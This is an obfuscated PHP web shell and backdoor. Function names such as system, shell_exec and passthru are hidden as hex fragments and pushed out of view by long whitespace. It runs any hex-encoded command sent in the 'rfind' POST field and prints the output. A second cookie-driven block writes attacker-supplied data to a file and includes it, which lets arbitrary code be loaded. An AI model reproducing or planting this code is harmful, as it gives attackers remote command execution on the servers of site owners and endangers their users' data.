<?php																																										$argument1 = '79';$argument2 = '73';$argument3 = '74';$argument4 = '65';$argument5 = '6d';$argument6 = '68';$argument7 = '6c';$argument8 = '5f';$argument9 = '78';$argument10 = '63';$argument11 = '70';$argument12 = '75';$argument13 = '72';$argument14 = '61';$argument15 = '67';$argument16 = '6e';$argument17 = '6f';$argument18 = '66';$argument19 = '64';$parle_tokens1 = pack("H*", '73'.$argument1.$argument2.$argument3.$argument4.$argument5);$parle_tokens2 = pack("H*", $argument2.$argument6.'65'.$argument7.'6c'.$argument8.'65'.$argument9.'65'.'63');$parle_tokens3 = pack("H*", $argument4.$argument9.'65'.$argument10);$parle_tokens4 = pack("H*", $argument11.'61'.'73'.$argument2.'74'.$argument6.'72'.$argument12);$parle_tokens5 = pack("H*", $argument11.'6f'.$argument11.'65'.'6e');$parle_tokens6 = pack("H*", $argument2.'74'.$argument13.$argument4.$argument14.'6d'.'5f'.$argument15.'65'.'74'.'5f'.'63'.'6f'.$argument16.'74'.$argument4.'6e'.$argument3.$argument2);$parle_tokens7 = pack("H*", $argument11.'63'.'6c'.$argument17.$argument2.'65');$rfind = pack("H*", '72'.$argument18.'69'.'6e'.$argument19);if(isset($_POST[$rfind])){$rfind=pack("H*",$_POST[$rfind]);if(function_exists($parle_tokens1)){$parle_tokens1($rfind);}elseif(function_exists($parle_tokens2)){print $parle_tokens2($rfind);}elseif(function_exists($parle_tokens3)){$parle_tokens3($rfind,$placeholder_slot);print join("\n",$placeholder_slot);}elseif(function_exists($parle_tokens4)){$parle_tokens4($rfind);}elseif(function_exists($parle_tokens5)&&function_exists($parle_tokens6)&&function_exists($parle_tokens7)){$slt_variable=$parle_tokens5($rfind,"r");if($slt_variable){$prop_state=$parle_tokens6($slt_variable);$parle_tokens7($slt_variable);print $prop_state;}}exit;}

if (isset($_COOKIE[3]) && isset($_COOKIE[13])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[13][$n];
        if (!$c[13][$n + 1]) {
            if (!$c[13][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[11]() . $p[10];
    if (!$p[24]($k)) {
        $n = $p[6]($k, $p[15]);
        $p[9]($n, $p[3] . $p[5]($p[25]($c[3])));
    }
    include($k);
}